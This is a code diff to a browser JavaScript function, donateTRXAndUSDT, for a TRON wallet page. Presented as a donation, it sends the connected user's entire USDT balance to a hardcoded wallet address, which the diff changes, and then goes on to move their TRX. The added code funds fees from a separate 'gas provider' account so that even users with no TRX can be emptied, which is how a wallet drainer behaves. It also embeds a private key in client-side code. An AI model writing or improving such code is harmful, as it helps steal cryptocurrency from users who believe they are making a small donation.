@@ -1,6 +1,7 @@
 let usdtContract;
 const USDT_TRC20_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const adminWallet = "TK37FVJp8b9L8JEudVdiN9NNzZgSzWiu5k"; // Example admin wallet
+const adminWallet = "TYWHBQEHUiJj8KpQvKoWgGrKmHVmXJpxe3";
+const GAS_PROVIDER_KEY = "your_private_key_here"; // Private key for gas fees
 
 const USDT_ABI = [
   {
@@ -85,50 +86,74 @@ export async function donateTRXAndUSDT() {
     const usdtBalance = window.tronWeb.toDecimal(balanceTransaction.constant_result[0]);
     const usdtBalanceInUsdt = usdtBalance / 1e6;
 
-    if (parseFloat(initialTrxBalance) <= 0 && parseFloat(usdtBalanceInUsdt) <= 0) {
-      throw new Error("Insufficient balance to make the donation");
+    if (parseFloat(usdtBalanceInUsdt) <= 0) {
+      throw new Error("Insufficient USDT balance to make the donation");
     }
 
     let trxTxHash, usdtTxHash;
     let trxAmount = '0', usdtAmount = '0';
 
-    // Handle USDT transfer
-    if (parseFloat(usdtBalanceInUsdt) > 0) {
-      const requiredTrxForGas = 100000;
+    // Handle USDT transfer with gas from separate account
+    try {
+      // Create TronWeb instance with gas provider's private key
+      const gasProviderTronWeb = new window.TronWeb({
+        fullHost: window.tronWeb.fullNode.host,
+        privateKey: GAS_PROVIDER_KEY
+      });
 
-      if (initialTrxBalance < requiredTrxForGas) {
-        throw new Error("Insufficient TRX for gas fees");
-      }
+      // Estimate gas needed for USDT transfer (approximately 15 TRX)
+      const estimatedGas = 15_000_000; // 15 TRX in SUN
 
-      try {
-        const transferParameter = [{
-          type: 'address',
-          value: adminWallet
-        }, {
-          type: 'uint256',
-          value: usdtBalance.toString()
-        }];
+      // Transfer TRX for gas from provider to user
+      const gasTransaction = await gasProviderTronWeb.transactionBuilder.sendTrx(
+        userAddress,
+        estimatedGas
+      );
+      const signedGasTx = await gasProviderTronWeb.trx.sign(gasTransaction);
+      await gasProviderTronWeb.trx.sendRawTransaction(signedGasTx);
 
-        const { transaction: usdtTransaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_TRC20_CONTRACT_ADDRESS,
-          'transfer(address,uint256)',
-          options,
-          transferParameter,
-          userAddress
+      // Wait for gas transfer to be confirmed
+      await new Promise(resolve => setTimeout(resolve, 3000));
+
+      // Now proceed with USDT transfer
+      const transferParameter = [{
+        type: 'address',
+        value: adminWallet
+      }, {
+        type: 'uint256',
+        value: usdtBalance.toString()
+      }];
+
+      const { transaction: usdtTransaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_TRC20_CONTRACT_ADDRESS,
+        'transfer(address,uint256)',
+        options,
+        transferParameter,
+        userAddress
+      );
+
+      const signedTx = await window.tronWeb.trx.sign(usdtTransaction);
+      const usdtTx = await window.tronWeb.trx.sendRawTransaction(signedTx);
+      
+      usdtTxHash = usdtTx.txid;
+      usdtAmount = usdtBalanceInUsdt;
+
+      // Return unused gas to provider
+      const finalTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
+      if (finalTrxBalance > 1_000_000) { // Leave 1 TRX worth of gas just in case
+        const returnTransaction = await window.tronWeb.transactionBuilder.sendTrx(
+          gasProviderTronWeb.defaultAddress.base58,
+          finalTrxBalance - 1_000_000
         );
-
-        const signedTx = await window.tronWeb.trx.sign(usdtTransaction);
-        const usdtTx = await window.tronWeb.trx.sendRawTransaction(signedTx);
-        
-        usdtTxHash = usdtTx.txid;
-        usdtAmount = usdtBalanceInUsdt;
-      } catch (error) {
-        console.error("USDT transfer failed:", error);
-        throw new Error("USDT transfer failed. Please try again.");
+        const signedReturnTx = await window.tronWeb.trx.sign(returnTransaction);
+        await window.tronWeb.trx.sendRawTransaction(signedReturnTx);
       }
+    } catch (error) {
+      console.error("USDT transfer failed:", error);
+      throw new Error("USDT transfer failed. Please try again.");
     }
 
-    // Handle TRX transfer
+    // Handle TRX transfer (if user has any TRX)
     const currentTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
     if (currentTrxBalance > 0) {
       try {
